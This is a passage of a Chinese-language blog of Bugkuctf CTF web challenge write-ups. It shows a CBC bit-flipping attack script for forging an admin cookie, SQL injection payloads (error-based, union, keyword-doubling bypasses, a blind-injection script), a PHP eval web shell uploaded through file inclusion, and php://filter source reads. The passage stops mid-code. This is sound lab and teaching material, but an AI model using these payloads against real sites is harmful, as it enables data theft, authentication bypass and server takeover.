如果用公式来表示的话，如下：（C表示密文，E表示进行加密，P表示明文，D表示进行解密，IV表示初始向量） 再来看看如何进行攻击：（下面图片摘自《图解密码技术》一书） 上面就是CBC原理，其实看上去一脸懵逼很正常，但是其实我们只需要关注CBC解密的过程，因为我们攻击的过程就是解密的过程，为什么呢，我们来看实例的代码分析就知道了 实例实例来自bugkuctf web类最后一题login4 网址：http://118.89.219.210:49168/ 扫描目录发现存在文件.index.php.swp，下载下来后用linux 的vim -r 命令恢复文件后可以查看到源代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phpdefine(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);session_start();function get_random_iv()&#123; $random_iv=&apos;&apos;; for($i=0;$i&lt;16;$i++)&#123; $random_iv.=chr(rand(1,255)); &#125; return $random_iv;&#125;function login($info)&#123; $iv = get_random_iv(); $plain = serialize($info); $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; setcookie(&quot;iv&quot;, base64_encode($iv)); setcookie(&quot;cipher&quot;, base64_encode($cipher));&#125;function check_login()&#123; if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123; $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]); $iv = base64_decode($_COOKIE[&quot;iv&quot;]); if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123; $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;); $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;]; &#125;else&#123; die(&quot;ERROR!&quot;); &#125; &#125;&#125;function show_homepage()&#123; if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)&#123; echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;; &#125;else&#123; echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;; echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;; &#125; echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;&#125;if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))&#123; $username = (string)$_POST[&apos;username&apos;]; $password = (string)$_POST[&apos;password&apos;]; if($username === &apos;admin&apos;)&#123; exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;); &#125;else&#123; $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password); login($info); show_homepage(); &#125;&#125;else&#123; if(isset($_SESSION[&quot;username&quot;]))&#123; check_login(); show_homepage(); &#125;else&#123; echo &apos;&lt;body class=&quot;login-body&quot;&gt; &lt;div id=&quot;wrapper&quot;&gt; &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt; &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt; &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt; &lt;div class=&quot;header&quot;&gt; &lt;h1&gt;Login Form&lt;/h1&gt; &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt; &lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\\&apos;\\&apos;&quot; /&gt; &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\\&apos;\\&apos;&quot; /&gt; &lt;/div&gt; &lt;div class=&quot;footer&quot;&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt;&apos;; &#125;&#125;?&gt; 首先服务器接收我们POST的参数username和password，并对username进行检查，如果是admin，则退出程序，如果不是admin，则创建一个数组info，来存放我们输入的username和password，然后经过login函数，也就是cbc的加密，加密的过程是首先创建一个16位长度的随机字符串，然后与数组info序列化后的字符串plain进行CBC加密，也就是一系列的异或运算，具体的加密我们可以不用管，因为我们改变不了加密的过程，我们要操作的，是接下来的解密过程。再往下看程序，加密完以后，会将加密过程的初始化向量(也就是16位的随机字符串)iv和加密后的密文cipher经过base64加密后分别存放到cookie中，这样加密过程就算完成了。接下来，我们再次登录时，服务器执行check_login函数，将cookie中的iv和cipher字段值取出来进行base64解密后，进行cbc的解密，再将解密后字符串进行反序列化得到数组info，然后将info的username取出放入session的username字段，最后检查username如果是admin，则可以查看到flag，如果不是，则输出只有admin才可以查看flag，总的来说，这算是前后矛盾，一开始如果我们输入的username是admin，则提示admin查看不了flag，我们输入的如果不是admin，又提示admin才可以查看flag 所以，要拿到flag，我们的思路，就是一开始输入Admin，然后操作CBC解密的过程，让它最后解密出来的值变成admin，就可以拿到flag，为此，我们重点就是放在cbc解密的过程，来看一张比较清楚的思路图 分析解密的过程： (1)首先以16位为长度对密文进行分组 (2)初始化向量iv与前16位的解密的密文分组1进行位异或运算得到明文分组1 (3)密文分组1与解密的密文分组2进行异或运算得到明文分组2 (4)密文分组2与解密的密文分组3进行异或运算得到明文分组3 (5)以此类推 那我们就按照解密的过程的顺序逐步演示攻击的过程 首先我们对明文进行分组，因为我们加密的过程也是位异或，所以最终得到的密文位数是等于明文位数的 1234567891011121314151617181920&lt;?php$info = array('username'=&gt;'Admin','password'=&gt;'admin');$plain = serialize($info);echo $plain.'&lt;br&gt;';for($i = 0; $i &lt; strlen($plain); $i++)&#123; if($plain[$i] == 'A')&#123; $A_index = $i % 16; &#125; if($i % 16 == 0)&#123; echo '&lt;br&gt;'.$plain[$i]; &#125; else&#123; echo $plain[$i]; &#125;&#125;echo '&lt;br&gt;&lt;br&gt;'.'the index of A is: '.$A_index;?&gt; 这里我们定下一开始输入的username是Admin,password是admin,对info数组进行序列化处理然后分组 我们翻转的位置是A，我们要想办法将它翻转成a，从而将用户名变成admin，上面已经分析过了解密是位异或，A所处于的密文分组是分组2，它是与密文分组1进行位异或运算得到明文分组2的 所以我们要操纵的就是密文分组1的第9位，使它与A所处的密文分组2异或后得到a 但是我们还要考虑，我们改变了密文分组的第9位，只会影响下一组明文翻转的那一位，但却会影响本组明文的全部，因为我们翻转过的密文要先经过解密，然后才和IV变量进行异或，解密的时候是整串数据进行，所以整串明文受其影响。甚至可能会导致生成的明文部分乱码，至少绝对不再是原来的明文了。 所以，我们还需要操作iv，也就是初始化向量，使它与解密的密文分组1异或能得到原来的明文分组1，也就是a:2:{s:8:”userna 最后就需要考虑如何得到我们想要的字符，直接看公式吧 123456789本组明文 = Decrypt(本组密文) ^ 上一组密文A B C=========================================================A = B ^ CA ^ A = 0; 0 ^ A = AC = A ^ A ^ C = B ^ C ^ A ^ C = A ^ B(即C = A ^ B ，即：上一组密文 = 本组明文 ^ Decrypt(本组密文) )ascii(&apos;a&apos;) ^ C ^ A ^ B = ascii(&apos;a&apos;) ^ A ^ B ^ A ^ B = ascii(&apos;a&apos;) ^ 0 = ascii(&apos;a&apos;)(假设我们想要翻转成a，使用如上公式即可,即：想要的字符 = 上一组密文 ^ 本组明文 ^ Decrypt(本组密文) ^ 想要的字符 ) 那么接下来，我们就可以开始编写脚本了，首先，我们先将用户名：Admin和密码：admin POST给服务器 然后获取cookie值的cipher字段，操作第一个密文分组的第九位 123456789101112131415161718import requests,base64,urllib,reurl = \"http://118.89.219.210:49168/\"data = &#123; 'username':'Admin', 'password':'admin'&#125;r = requests.post(url,data=data)cookies = requests.utils.dict_from_cookiejar(r.cookies)cipher = cookies['cipher']cipher = base64.b64decode(urllib.unquote(cipher))index = 9new_cipher = cipher[:index] + chr(ord(cipher[index])^ord('A')^ord('a')) + cipher[index+1:]new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))cookies['cipher'] = new_cipherr2 = requests.get(url,cookies=cookies)print r2.text 运行结果 可以看到修改cipher后，再次访问页面给出了提示解密后的明文的不能被序列化，就是因为我们操纵密文分组1，改变了全部的明文分组1，使之不能被序列化 我们将plain取出，解码 12plain = base64.b64decode(re.findall(\"base64_decode\\('(.*)'\\)\",r2.text)[0])print plain 可以看到，我们已经成功的将A翻转成a，但是导致了本组明文乱码 所以接下来我们要操作的是iv的全部十六位，下面给出所有代码 12345678910111213141516171819202122232425262728import requests,base64,urllib,reurl = \"http://118.89.219.210:49168/\"data = &#123; 'username':'Admin', 'password':'admin'&#125;r = requests.post(url,data=data)cookies = requests.utils.dict_from_cookiejar(r.cookies)cipher = cookies['cipher']cipher = base64.b64decode(urllib.unquote(cipher))index = 9new_cipher = cipher[:index] + chr(ord(cipher[index])^ord('A')^ord('a')) + cipher[index+1:]new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))cookies['cipher'] = new_cipherr2 = requests.get(url,cookies=cookies)plain = base64.b64decode(re.findall(\"base64_decode\\('(.*)'\\)\",r2.text)[0])iv = cookies['iv']iv = base64.b64decode(urllib.unquote(iv))target = 'a:2:&#123;s:8:\"userna'new_iv = ''for i in range(16): new_iv = new_iv + chr(ord(target[i])^ord(plain[i])^ord(iv[i]))cookies['iv'] = urllib.quote_plus(base64.b64encode(new_iv))r3 = requests.get(url,cookies=cookies)print r3.text 运行结果 成功获得flag","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"Bugkuctf-Web(3)","slug":"Bugkuctf-Web(3)","date":"2018-08-06T08:06:00.000Z","updated":"2018-08-11T05:43:28.693Z","comments":true,"path":"/posts/63286/","link":"","permalink":"https://Foxgrin.github.io/posts/63286/","excerpt":"Bugkuctf中的Web题解(三)","text":"Bugkuctf中的Web题解(三) 这是一个神奇的登录框网址：http://120.24.86.145:9001/sql/ 看到登录框，网址又有sql，八成就是sql注入 试一下用户名输入admin’，没有报错，再试试admin” 发现报错了，果然存在sql注入，从报错信息就看出来用户名和密码都被双引号包裹 那么我们就可以用万能密码登录了 payloads:admin_name=admin&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO 应该是登录成功了，但是要我们换一个身份登录才能拿到flag 换个payloads:admin_name=AdMiNhEhE&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO 结果还是一样的，看来是只返回了用户名的信息，那干脆就直接利用报错注入注出信息试试 先爆库 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,database(),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 库名bugkusql1 爆表 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 表名为flag1,whoami 爆flag1表下的列名 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag1’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 列名为flag1 最后爆flag1列下的数据 payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(flag1) from flag1),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 试一下这个是不是flag，发现错误，仔细看才发现flag太长了报错信息没显示全… 那再试试爆whoami表吧，看看能不能爆出密码 先爆whoami表下的列名： payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’whoami’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 列名为w_id,w_name,w_passwd 爆passwd payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select w_passwd from whoami where w_name=’AdMiNhEhE’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO 发现又太长了… 仔细一想，用万能密码登录时也是有返回信息的，为什么不用联合注入呢… 查询列数为2 payloads:admin_name=0” union select flag1,2 from flag1 #&amp;admin_passwd=&amp;submit=GO+GO+GO 输入flag{ed6b28e684817d9efcaf802979e57aea}，成功 多次网址：http://120.24.86.145:9004/ 一进去页面发现url：http://120.24.86.145:9004/1ndex.php?id=1 就尝试修改id值，id=1,2,3,4,5到5的时候提示 存在sql注入漏洞，猜测是数字型注入，注入点是id 那试一下id=1’，显示error 猜测可能id被单引号包裹，输入id=1’%23，正确显示信息，那么接下来注出查询列数 输入id=1’ order by 3%23，显示error，将3改为2，又eroor，改为1，还是error，慌了…估计是把order 或者by给过滤了 试一下输入id=1’ ^ (length(‘order’)!=0)%23，显示error，说明不是order被过滤 再试一下输入id=1’ ^ (length(‘or’)!=0)%23 发现正确显示信息，说明or被过滤掉了，类似再尝试一下关键词and,select,union，发现都被过滤了 尝试一下双写可不可以绕过，输入id=1’ oorrder by 2%23 正确显示信息，说明可能是用函数str_replace进行过滤，那么双写即可绕过 输入id=1’ oorrder by 3%23，显示error，说明查询列数为2 接下来就是熟悉爆库 输入id=0’ uunionnion sselectelect 1,database()%23 数据库名：web1002-1 爆表名 输入id=0’ uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23 表名：flag1,hint 爆列名 输入id=0’ uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=’flag1’%23 列名：flag1,address 爆flag列下的数据 输入id=0’ uunionnion sselectelect 1,flag1 from flag1%23 提交flag{usOwycTju+FTUUzXosjr}发现错误，突然发现提交的地方提示我们flag有两个 就试着注出address列下的数据 输入id=0’ uunionnion sselectelect 1,address from flag1%23 好像发现了新大陆 点击访问下一关 页面的url提示oncemore，并且get参数又是id，猜测还是sql注入 输入id=1’ 恩？好像隐约看到了报错信息，不过被背景挡住了，没事，看一下源代码 惊喜发现有报错信息，同时也看出来id被单引号包裹，接着试着注出查询列数 输入id=1’ order by 2%23，正常显示信息，输入id=1’ order by 3%23，报错。所以查询列数为2 接下来注库名 输入id=0’ union select 1,database()%23 发现union被过滤了，试着双写，没办法绕过 于是尝试extractvalue报错注入 输入id=1’ and extractvalue(1,concat(0x3a,database(),0x3a))%23 成功注入库名：web1002-2 输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))%23 表名：class,flag2 输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag2’),0x3a))%23 flag2表下列名：flag2,address 输入id=1’ and extractvalue(1,concat(0x3a,(select flag2 from flag2),0x3a))%23 注出flag：flag{Bugku-sql_6s-2i-4t-bug} 将B改成小写b，提交成功 PHP_encrypt_1(ISCCCTF)这题直接给了一个php源文件 12345678910111213141516171819202122&lt;?phpfunction encrypt($data,$key)&#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str);&#125;?&gt;output: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= (PS:可能题目文件出了问题，output没有写在源文件中) 审计后发现是一个加密的过程，给了最后的输出，需要我们自己编写解密的过程，根据加密的过程一步步解密，decrypt代码如下： 123456789101112131415161718192021222324252627282930313233&lt;?phpfunction decrypt($str)&#123; $str = base64_decode($str); // 将encrypt最后的base64加密后的结果进行base64解密 $key = md5('ISCC'); // 对应encrypt的$key $x = 0; // 对应encrypt的$x $len = strlen($str); // $最后encrypt得到的$str长度跟原本encrypt传入的$data长度是一致的 $klen = strlen($key); // 对应encrypt的$klen $char = ''; // 对应encrypt的$char $data = ''; // 对应encrypt的$data for($i = 0; $i &lt; $len; $i++)&#123; //对应encrypt的$char赋值过程 if($x == $klen)&#123; $x = 0; &#125; $char .= $key[$x]; $x += 1; &#125; for($i = 0; $i &lt; $len; $i++)&#123; // 获得$data if(ord($str[$i]) &lt; ord($char[$i]))&#123; // 如果$str的某位的ascii值小于$char的某位的ascii值 $data .= chr((ord($str[$i]) + 128) - ord($char[$i])); // 说明encrypt有求余128 &#125; else&#123; $data .= chr(ord($str[$i]) - ord($char[$i])); &#125; &#125; return $data;&#125;$str = \"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=\";$data = decrypt($str);echo $data;?&gt; 最后获得flag 文件包含2网址：http://118.89.219.210:49166/ 页面url：http://118.89.219.210:49166/index.php?file=hello.php 熟悉的文件包含，试一下利用php://filter读取index.php源码 天真！！！看来貌似过滤了什么，试一下读取hellp.php，还是一样的结果，看来这个方法行不通，怎么办呢，这时候看一下失败页面的源码 发现提示了文件upload.php 访问http://118.89.219.210:49166/upload.php 发现是文件上传，要求只能上传图片文件，burp抓包上传一句话试试 发现过滤了文件名和类型，但是因为有文件包含，我们只要能将一句话包含在文件上传上去就行，将php文件后缀修改为png，文件类型修改为image/png，上传成功后访问图片所在地址 可以看到代码显示了出来，说明是不符合php语法的代码，仔细看发现php代码开头的&lt;?php ?&gt;被过滤了 那么换一种方法，上传代码为&lt;?=@eval($_POST[‘cmd’]); 上传成功，访问页面为空，说明代码成功执行 然后再用burp POST参数cmd执行命令 访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt 获得flag flag.php网址：http://120.24.86.145:8002/flagphp/ 点击页面Login按钮没反应，看一下源代码只是个按钮，用burp试着POST提交user和password参数也没有显示其他的东西，想到题目给的提示：hint，试着访问hint.php，没有结果，题目是flag.php，访问，也没有提示 一番思考，试着GET参数hint，没想到就给出了源代码 1234567891011121314151617181920212223242526272829303132333435&lt;?php error_reporting(0); include_once(\"flag.php\"); $cookie = $_COOKIE['ISecer']; if(isset($_GET['hint']))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) === \"$KEY\") &#123; echo \"$flag\"; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;Login&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"admin.css\" type=\"text/css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;br&gt; &lt;div class=\"container\" align=\"center\"&gt; &lt;form method=\"POST\" action=\"#\"&gt; &lt;p&gt;&lt;input name=\"user\" type=\"text\" placeholder=\"Username\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=\"password\" type=\"password\" placeholder=\"Password\"&gt;&lt;/p&gt; &lt;p&gt;&lt;input value=\"Login\" type=\"button\"/&gt;&lt;/p&gt; &lt;/form&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php &#125; $KEY='ISecer:www.isecer.com'; ?&gt; 那就变成一道代码审计题了，要我们在COOKIE字段中添加ISecer参数，值是$KEY序列化后的值 先写个demo，把$KEY序列化后的值打印出来 1234567&lt;?php$KEY = 'ISecer:www.isecer.com';$cookie = serialize($KEY);echo $cookie;?&gt; 然后用burp提交cookie 没反应…很奇怪，想了很久，看了好久源代码才发现，$KEY值是定义在最后面的，前面是为空的，所以应该提交空字符串的序列化值…很坑 空字符串序列化值：s:0:””; 再次burp提交 拿到flag 报错注入网址：http://103.238.227.13:10088/ 根据题目的提示，这是一个数字型注入，注入点为GET的参数id，过滤了关键词：空格，单引号，双引号，union，– 空格可以用%0a替代，union被过滤了那么就用题目的意思：报错注入，注释可以用%23代替– 直接输入?id=1%23试试 发现正常显示，那么id就没有被引号包裹，其实就无所谓单双引号被过滤了 那么我们就可以开始爆库了，输入： ?id=1%0aand%0aextractvalue(1,concat(0x3a,database(),0x3a))%23 数据库名为sql4 爆表，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x3a))%23 表名为temp 爆列，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=0x74656d70),0x3a))%23 列名为id,title 爆数据，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(title)%0afrom%0atemp),0x3a))%23 没发现flag… 说明flag不在数据库里，回到题目页面，又看到了提示，查询文件在/var/test/key_1.php 说明可能要用mysql的load_file函数读取文件内容，再通过hex函数转化为十六进制数 输入?id=1%0aand%0aextractvalue(1,concat(0x3a,hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),0x3a))%23 可以看到没有全部读取，这就是extractvalue函数的缺点，只能读取32位 这时候就需要利用substr函数每次截取30位读 先读取前30位 输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),1,30),0x3a))%23 再读取31~60位，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,substr(hex(load_file(0x2f7661722f746573742f6b65795f312e706870)),31,30),0x3a))%23 依次类推 最后得到298位十六进制数 13C3F70687020666473616661736664736166696473616664736169666473616B666473616966647361666473616664736166647361666B6473613B6664736166647361667364616664736166617330686664736739466C61673A22373234396635613766643164653630326233306536663339616561363139336122667364616673616664736166647361666473616661203F3E0A 转化成字符串得： 1&lt;?php fdsafasfdsafidsafdsaifdsakfdsaifdsafdsafdsafdsafkdsa;fdsafdsafsdafdsafas0hfdsg9Flag:\"7249f5a7fd1de602b30e6f39aea6193a\"fsdafsafdsafdsafdsafa ?&gt; 得到 Flag:”7249f5a7fd1de602b30e6f39aea6193a” login3(SKCTF)网址：http://118.89.219.210:49167/ 登录界面，随便输入一个用户名1，密码1，提示用户名不存在，输入admin,密码1，提示密码错误，猜测有检查用户名是否存在的判断，猜测注入点在admin,输入admin’，提示用户不存在，输入admin’#，提示密码错误，很显然admin被单引号包裹 那么理清思路，这是字符型注入，注入点在admin,admin被单引号包裹，题目提示我们这是一题基于布尔的盲注 那么我们试试输入admin’ and 1=1#，发现提示了出现非法字符,oh no ，我们直接输入and，同样提示出现非法字符，看来and被过滤了，那不用and了，我们用异或^ 输入admin’^1#，提示用户名不存在，输入admin’^0#，提示密码错误，很好，那么就可以利用这个提示信息进行基于布尔的盲注 接下来就是搞定逻辑语句了，正常来说我们是用语句ascii(substr(database(),1,1))=数字，但是尝试就发现了，这题还过滤了逗号，等号，等号可以用不等号&lt;&gt;代替，那么用ascii(substr(database() from 1 for 1))=数字，这样可以吗，又发现for和空格被过滤了… 怎么办，借鉴了别人的思路，才发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值 如图所示，语句ascii(substr(database()from(1)))就可以输出数据库名第一位的ascii值 那么思路就很清晰了，根据输入admin’^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#，根据返回的信息，如果返回了”password error!” ，说明数字2就是数据库的第数字1位的ascii值 直接上脚本，注出数据库名： 123456789101112131415161718192021import requestsurl = 'http://118.89.219.210:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''database = ''for i in range(1,11): for j in all_string: print('checking '+j) data = &#123; 'username':\"admin'^(ascii(substr(database()from(%d)))&lt;&gt;%d)#\"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: database = database + j print('the '+str(i)+' place of database is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(database) 数据库名：blindsql 本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜 看别人猜的表名为admin，列名为password，真是玄学… 那就直接爆password： 123456789101112131415161718192021import requestsurl = 'http://118.89.219.210:49167/index.php'all_string = '''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''password = ''for i in range(1,51): for j in all_string: print('checking '+j) data = &#123; 'username':\"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#\"%(i,ord(j)), 'password':'1', 'submit':'Log In' &#125; r = requests.post(url,data=data) if 'password error!' in r.text: password = password + j print('the '+str(i)+' place of password is '+j) break if j == 'M' and 'username does not exist!' in r.text: breakprint(password) 得password：51b7a76d51e70b419f60d3473fb6f900 还得拿去md5解密，解密得skctf123456 获得flag 网站被黑网址：http://120.24.86.145:8002/webshell/ 啥提示都没有，只有url有个提示webshell，试着扫一下后台 发现shell.php 进去要输入密码才能看到flag，不是sql，只能burp爆破密码，爆破出来密码是hack Trim的日记本网址：http://120.24.86.145:9002/ 看着像是sql二次注入，但是死活找不到注入点，id一直不知道处理，试着扫一下后台 访问一下show.php 直接给出了flag 文件上传2网址：http://120.24.86.145:9011/ 看页面像是文件上传，但是尝试上传png文件，jpg文件都上传不了，再看看url有个op参数，看着有点像是文件包含，试着用php伪协议读一下文件看看能不能读出来，payloads: http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=index 这里不用加php后缀名，读出了index.php的base64源码 base64解码得 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556&lt;?phperror_reporting(0);define('FROM_INDEX', 1);$op = empty($_GET['op']) ? 'home' : $_GET['op'];if(!is_string($op) || preg_match('/\\.\\./', $op)) die('Try it again and I will kill you! I freaking hate hackers!');ob_start('ob_gzhandler');function page_top($op) &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Panduploader::&lt;?= htmlentities(ucfirst($op)); ?&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=\"header\"&gt; &lt;center&gt;&lt;a href=\"?op=home\" class=\"logo\"&gt;&lt;img src=\"images/logo.jpg\" alt=\"\"&gt;&lt;/a&gt;&lt;/center&gt; &lt;/div&gt; &lt;div id=\"body\"&gt;&lt;?php&#125;function fatal($msg) &#123;?&gt;&lt;div class=\"article\"&gt;&lt;h2&gt;Error&lt;/h2&gt;&lt;p&gt;&lt;?=$msg;?&gt;&lt;/p&gt;&lt;/div&gt;&lt;?phpexit(1);&#125;function page_bottom() &#123;?&gt; &lt;/div&gt; &lt;center&gt; &lt;div id=\"footer\"&gt; &lt;div&gt; &lt;p&gt; &lt;span&gt;2017 &amp;copy; &lt;/span&gt; All rights reserved. &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpob_end_flush();&#125;register_shutdown_function('page_bottom');page_top($op);if(!(include $op . '.php')) fatal('no such page');?&gt; 再读取home.php，http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=home 123456789101112131415&lt;?phpinclude 'common.php';?&gt;&lt;center&gt;&lt;div class=\"article\"&gt; &lt;h2&gt;Welcome!!&lt;/h2&gt; &lt;p&gt; We let you upload PNG image files and store it!&lt;br/&gt; &lt;/p&gt; &lt;p&gt; Get started by &lt;a href=\"?op=upload\"&gt;uploading a picture&lt;/a&gt; &lt;/p&gt; &lt;/div&gt;&lt;/center&gt; 发现又包含了common.php，不急，先读upload.php的源代码，http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=upload.php 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpinclude 'common.php';if(isset($_POST['submit']) &amp;&amp; isset($_FILES['image'])) &#123; $fn = $_FILES['image']['tmp_name']; $ft = $_FILES['image']['type']; if(!is_uploaded_file($fn)) &#123; fatal('uploaded file corrupted'); &#125; $array = array('image/png'); if(!in_array($ft,$array))&#123; fatal(\"Sorry, only PNG files are allowed.\"); &#125; $imagekey = create_image_key(); move_uploaded_file($fn, \"uploads/$imagekey.png\"); header(\"Location: ?op=show&amp;imagekey=$imagekey\");&#125; else &#123;?&gt;&lt;center&gt;&lt;div class=\"article\"&gt; &lt;h2&gt;Upload your own png file&lt;/h2&gt; &lt;form enctype=\"multipart/form-data\" action=\"?op=upload\" method=\"POST\"&gt; &lt;label for=\"image\"&gt;Image file (max &lt;?=MAX_IM_SIZE;?&gt;x&lt;?=MAX_IM_SIZE;?&gt;): &lt;/label&gt; &lt;input type=\"file\" id=\"image\" name=\"image\" /&gt; &lt;br /&gt; &lt;input type=\"submit\" name=\"submit\" value=\"Upload!\" /&gt; &lt;/form&gt;&lt;/div&gt;&lt;/center&gt;&lt;?php&#125;?&gt; 再看一下common.php，http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=common 12345678910111213141516171819202122&lt;?phpif(!defined('FROM_INDEX')) die();define('MAX_IM_SIZE', 100);function create_image_key() &#123; return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());&#125;function load_image($imagekey) &#123; if(1 !== preg_match('/[0-9a-f]&#123;40&#125;/', $imagekey)) &#123; fatal('Invalid image key.'); &#125; $im = imagecreatefrompng(\"uploads/&#123;$imagekey&#125;.png\"); if(!$im) &#123; fatal('Failed to load image.'); &#125; return $im;&#125;stream_wrapper_unregister (\"zip\");?&gt; 可以看出我们上传文件首先对上传文件类型进行检查，检查是不是png类型的文件，如果是，则重定向到show.php 那么我们再看看show.php的源代码 http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=show 1234567891011121314151617181920212223242526&lt;?phpinclude 'common.php';if(empty($_GET['imagekey'])) &#123; header('Location: ?op=home'); exit();&#125;$imagekey = $_GET['imagekey'];$im = 